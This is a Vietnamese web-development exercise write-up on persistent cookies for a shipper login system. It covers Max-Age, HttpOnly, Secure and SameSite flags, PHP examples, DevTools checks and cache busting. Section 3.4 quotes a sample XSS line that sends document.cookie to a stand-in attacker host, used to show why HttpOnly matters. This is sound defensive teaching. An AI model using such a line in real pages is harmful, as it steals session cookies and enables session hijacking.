# Session16 – Ex02: Duy trì phiên đăng nhập bằng Persistent Cookie & bảo mật



## 1. Bối cảnh

Hệ thống vận tải yêu cầu shipper đăng nhập để nhận đơn. Tuy nhiên, mỗi lần shipper **đóng trình duyệt hoặc load lại trang**, giỏ hàng phụ tùng xe bị trống và phải **đăng nhập lại từ đầu**.

### Nguyên nhân

Hệ thống đang dùng **Session Cookie**: cookie **không có** `Max-Age` / `Expires`, nên chỉ nằm trong bộ nhớ tạm của trình duyệt và **bị xóa khi đóng trình duyệt**. Server không còn nhận ra shipper nên coi như người dùng mới.

**Hướng giải quyết:** chuyển sang **Persistent Cookie** (có `Max-Age`), lưu xuống ổ đĩa và còn hiệu lực qua các lần mở lại trình duyệt, đồng thời đặt các cờ bảo mật `HttpOnly`, `Secure`.

![Session Cookie và Persistent Cookie](images/04-session-vs-persistent.png)

| | Session Cookie | Persistent Cookie |
|---|---|---|
| Thuộc tính thời hạn | Không có `Max-Age`/`Expires` | Có `Max-Age` (hoặc `Expires`) |
| Nơi lưu | Bộ nhớ RAM của trình duyệt | Ổ đĩa của máy |
| Khi đóng trình duyệt | **Bị xóa** | **Vẫn còn** đến khi hết hạn |
| Phù hợp | Phiên ngắn, máy dùng chung | Ghi nhớ đăng nhập (shipper) |

---

## 2. Phần 1 – Phân tích: Cache (MB/GB) và Cookies (~4KB)

![Cookie và Cache](images/06-cache-vs-cookie.png)

| Tiêu chí | Cookie | Cache trình duyệt |
|---|---|---|
| **Dung lượng** | Rất nhỏ, khoảng **4 KB** mỗi cookie | Lớn, **hàng MB đến GB** (tùy trình duyệt và ổ đĩa) |
| **Lưu gì** | Token định danh, cờ nhỏ | CSS, JS, ảnh, font (tài nguyên tĩnh) |
| **Gửi lên server?** | **Có**, tự đính kèm trong **mọi request** | **Không**, đọc cục bộ từ máy |
| **Ưu điểm** | Giúp server nhận ra người dùng giữa các request | Tải trang nhanh, giảm tải cho server |
| **Nhược điểm** | Nhỏ; nếu nhét nhiều dữ liệu sẽ làm **mọi request nặng và chậm** | Có thể **cũ (stale)** → hiển thị giao diện cũ |
| **Bảo mật** | Chứa định danh nên cần `HttpOnly` + `Secure` | Không nên chứa dữ liệu nhạy cảm |

### Sự đánh đổi

- **Cookie nhỏ nhưng "đắt":** vì được gửi kèm mọi request nên mỗi KB thêm vào đều tốn băng thông cho cả chiều đi lẫn về. Vì vậy cookie chỉ nên chứa **một token ngắn**.
- **Cache lớn nhưng "tĩnh":** dung lượng lớn nên chứa được toàn bộ file giao diện, giúp trang tải nhanh. Đổi lại, nội dung có thể **lỗi thời** khi server đã cập nhật.
- **Áp dụng cho bài toán giỏ hàng:** **không** lưu cả giỏ hàng phụ tùng vào cookie (vượt 4 KB, lộ dữ liệu, chậm). Cách đúng là cookie chỉ giữ **token**, còn **giỏ hàng lưu phía server** (CSDL) gắn với token đó. Khi shipper quay lại, server dùng token tìm lại giỏ hàng.
- Giao diện (CSS/JS/ảnh) nên để **cache** xử lý, không đưa vào cookie.

---

## 3. Phần 2 – Triển khai: cấu trúc mẩu tin Cookie

![Cấu trúc Set-Cookie](images/05-cookie-anatomy.png)

### 3.1. Header server gửi về

```http
Set-Cookie: session_token=9f3a1c...e7b2; Max-Age=604800; Path=/; Secure; HttpOnly; SameSite=Strict
```

### 3.2. Ý nghĩa từng thành phần

| Thành phần | Ý nghĩa | Vai trò |
|---|---|---|
| `session_token=<TOKEN>` | Chuỗi **ngẫu nhiên**, khó đoán (ví dụ 64 ký tự hex). Chỉ là **mã tham chiếu**, không chứa mật khẩu hay thông tin cá nhân | Định danh phiên làm việc |
| `Max-Age=604800` | Thời gian sống tính bằng giây: 7 × 24 × 60 × 60 = **604800 s (7 ngày)** | **Chức năng 1:** biến thành Persistent Cookie |
| `Path=/` | Cookie có hiệu lực trên toàn bộ website | Phạm vi |
| `Secure` | Chỉ gửi qua **HTTPS** | **Chức năng 2:** chống nghe lén (sniffing) |
| `HttpOnly` | **JavaScript không đọc được** cookie (`document.cookie` không thấy) | **Chức năng 2 + Ràng buộc:** chống XSS đánh cắp session |
| `SameSite=Strict` | Không gửi cookie khi request đến từ trang web khác | Giảm nguy cơ CSRF |

> **Lưu ý:** nếu có cả `Max-Age` và `Expires` thì trình duyệt ưu tiên `Max-Age`.

### 3.3. Ví dụ mã PHP (phía server)

```php
<?php
// 1. Sinh token ngẫu nhiên, đủ mạnh
$token = bin2hex(random_bytes(32)); // 64 ký tự hex

// 2. Lưu token -> user_id + hạn dùng vào CSDL (phía server)
//    (giỏ hàng của shipper cũng lưu phía server theo user_id)

// 3. Gửi Persistent Cookie kèm cờ bảo mật
setcookie('session_token', $token, [
    'expires'  => time() + 7 * 24 * 60 * 60, // 7 ngày
    'path'     => '/',
    'secure'   => true,      // chỉ HTTPS
    'httponly' => true,      // JS không đọc được
    'samesite' => 'Strict',
]);
```

Nếu dùng session có sẵn của PHP, cấu hình tương đương:

```php
session_set_cookie_params([
    'lifetime' => 604800,
    'path'     => '/',
    'secure'   => true,
    'httponly' => true,
    'samesite' => 'Strict',
]);
session_start();
session_regenerate_id(true); // đổi ID sau khi đăng nhập thành công
```

### 3.4. Đáp ứng ràng buộc (JavaScript không truy cập được dữ liệu định danh)

Kịch bản tấn công: kẻ xấu chèn mã JavaScript (XSS) vào trang, ví dụ:

```js
fetch('https://evil.example/steal?c=' + document.cookie);
```

- **Không có** `HttpOnly`: `document.cookie` trả về `session_token=...` → bị đánh cắp → **Session Hijacking**.
- **Có** `HttpOnly`: `document.cookie` **không chứa** `session_token` → kẻ xấu không lấy được token.
- **Có** `Secure`: token không bị lộ khi truyền qua mạng không mã hóa (ví dụ Wi-Fi công cộng).

### 3.5. Biện pháp bổ sung

1. Token phải **ngẫu nhiên, đủ dài**, lưu và kiểm tra phía server; có thể **thu hồi** khi shipper đăng xuất.
2. **Tạo token mới** sau mỗi lần đăng nhập (chống session fixation).
3. **Không** lưu mật khẩu hoặc dữ liệu nhạy cảm trong cookie.
4. Triển khai bằng **HTTPS** (bắt buộc để cờ `Secure` hoạt động).
5. Khi shipper đăng xuất: xóa cookie bằng cách đặt `Max-Age=0` và xóa token trong CSDL.

### 3.6. Kiểm chứng bằng F12

1. Nhấn **F12** → tab **Application** (Chrome/Edge) hoặc **Storage** (Firefox) → **Cookies** → chọn tên miền.
2. Quan sát dòng `session_token`:
   - Cột **Expires / Max-Age** có ngày giờ cụ thể (không phải "Session") → Persistent.
   - Cột **HttpOnly** và **Secure** có dấu ✓.
3. Mở tab **Console**, gõ `document.cookie` → **không** thấy `session_token`.
4. Đóng hẳn trình duyệt, mở lại và vào trang → vẫn còn đăng nhập, giỏ hàng vẫn còn.

| Nội dung | Ảnh |
|---|---|
| Tab Application → Cookies: Expires + cờ HttpOnly/Secure | ![Cờ cookie](images/01-cookie-flags.png) |
| Console: `document.cookie` không hiện `session_token` | ![document.cookie](images/02-document-cookie.png) |

---

## 4. Phần 3 – Kiểm thử: đổi giao diện nhưng trình duyệt vẫn hiện màu cũ

### Nguyên nhân

Trình duyệt **lưu bản sao file CSS/JS/ảnh trong Cache** để tải nhanh. Khi lập trình viên đổi màu trong CSS nhưng trình duyệt vẫn dùng bản đã lưu, shipper sẽ thấy **giao diện cũ**. Đây là lỗi của **Cache**, không phải của Cookie.

### Cách xử lý: Hard Reload (tải lại cứng, bỏ qua cache)

**Cách 1: phím tắt**

| Hệ điều hành | Phím tắt |
|---|---|
| Windows / Linux | `Ctrl + Shift + R` hoặc `Ctrl + F5` |
| macOS | `Cmd + Shift + R` |

**Cách 2: Empty Cache and Hard Reload (mạnh nhất, dùng khi cách 1 chưa hiệu quả)**

1. Nhấn **F12** để mở DevTools (**phải để DevTools mở**).
2. **Nhấp chuột phải** vào nút **Tải lại (Reload)** cạnh thanh địa chỉ.
3. Chọn **Empty Cache and Hard Reload** (Xóa bộ nhớ đệm và tải lại cứng).

**Cách 3: tắt cache khi đang phát triển**

1. F12 → tab **Network** → tick **Disable cache** (chỉ có tác dụng khi DevTools đang mở).

**Cách 4: xóa dữ liệu duyệt web**

1. Nhấn `Ctrl + Shift + Delete` → chọn **Cached images and files** → **Clear data**.
2. **Không** tick **Cookies** nếu không muốn bị đăng xuất.

### Kiểm tra bằng F12 → Network

Sau khi Hard Reload, nhìn cột **Size** của file CSS:

- `(disk cache)` / `(memory cache)`: vẫn lấy từ cache (chưa mới).
- Có dung lượng thực (ví dụ `3.2 kB`) và Status **200**: đã tải lại từ server (đã mới).
- Status **304**: server xác nhận file chưa đổi nên dùng bản cache.

![Hard Reload](images/03-hard-reload.png)

### Phòng tránh cho lần sau (cache busting)

Đổi tên hoặc thêm phiên bản vào đường dẫn file mỗi khi cập nhật, để trình duyệt hiểu là file mới:

```html
<link rel="stylesheet" href="style.css?v=2">
```

> Hard Reload chỉ xóa **cache**, **không** xóa cookie đăng nhập. Shipper vẫn giữ nguyên phiên đăng nhập và giỏ hàng.

---

## 5. Kết luận

| Vấn đề | Nguyên nhân | Giải pháp |
|---|---|---|
| Đóng trình duyệt là mất đăng nhập, giỏ trống | Dùng **Session Cookie** (không có `Max-Age`) | Dùng **Persistent Cookie** với `Max-Age=604800`, giỏ hàng lưu phía server |
| Nguy cơ bị đánh cắp phiên (Session Hijacking) | Cookie có thể bị JavaScript đọc hoặc bị nghe lén | Đặt cờ **`HttpOnly`** + **`Secure`** (kèm `SameSite`) |
| Đổi giao diện nhưng vẫn thấy màu cũ | **Cache** trình duyệt còn giữ file cũ | **Hard Reload** (`Ctrl+Shift+R`), cache busting `?v=2` |
